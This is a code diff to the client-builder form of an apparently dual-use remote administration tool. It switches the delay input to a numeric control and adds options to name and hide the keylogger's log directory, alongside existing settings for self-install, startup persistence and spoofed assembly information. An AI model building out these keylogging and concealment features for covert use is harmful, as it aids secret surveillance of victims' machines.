@@ -32,7 +32,7 @@ namespace xServer.Forms
 
             txtTag.Text = profile.Tag;
             txtPassword.Text = profile.Password;
-            txtDelay.Text = profile.Delay.ToString();
+            numericUpDownDelay.Value = profile.Delay;
             txtMutex.Text = profile.Mutex;
             chkInstall.Checked = profile.InstallClient;
             txtInstallname.Text = profile.InstallName;
@@ -45,6 +45,8 @@ namespace xServer.Forms
             txtIconPath.Text = profile.IconPath;
             chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
             chkKeylogger.Checked = profile.Keylogger;
+            txtLogDirectoryName.Text = profile.LogDirectoryName;
+            chkHideLogDirectory.Checked = profile.HideLogDirectory;
             txtProductName.Text = profile.ProductName;
             txtDescription.Text = profile.Description;
             txtCompanyName.Text = profile.CompanyName;
@@ -64,7 +66,7 @@ namespace xServer.Forms
             profile.Tag = txtTag.Text;
             profile.Hosts = HostHelper.GetRawHosts(_hosts);
             profile.Password = txtPassword.Text;
-            profile.Delay = int.Parse(txtDelay.Text);
+            profile.Delay = (int)numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
             profile.InstallClient = chkInstall.Checked;
             profile.InstallName = txtInstallname.Text;
@@ -187,6 +189,12 @@ namespace xServer.Forms
                          !char.IsControl(e.KeyChar));
         }
 
+        private void txtLogDirectoryName_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            e.Handled = ((e.KeyChar == '\\' || FileHelper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
+                         !char.IsControl(e.KeyChar));
+        }
+
         private void btnMutex_Click(object sender, EventArgs e)
         {
             HasChanged();
@@ -241,7 +249,7 @@ namespace xServer.Forms
         private bool CheckForEmptyInput()
         {
             return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && // General Settings
-                 _hosts.Count > 0 && !string.IsNullOrWhiteSpace(txtPassword.Text) && !string.IsNullOrWhiteSpace(txtDelay.Text) && // Connection
+                 _hosts.Count > 0 && !string.IsNullOrWhiteSpace(txtPassword.Text) && // Connection
                  (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallname.Text))) && // Installation
                  (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
         }
@@ -260,7 +268,7 @@ namespace xServer.Forms
             options.Mutex = txtMutex.Text;
             options.RawHosts = HostHelper.GetRawHosts(_hosts);
             options.Password = txtPassword.Text;
-            options.Delay = int.Parse(txtDelay.Text);
+            options.Delay = (int)numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
             options.Version = Application.ProductVersion;
             options.InstallPath = GetInstallPath();
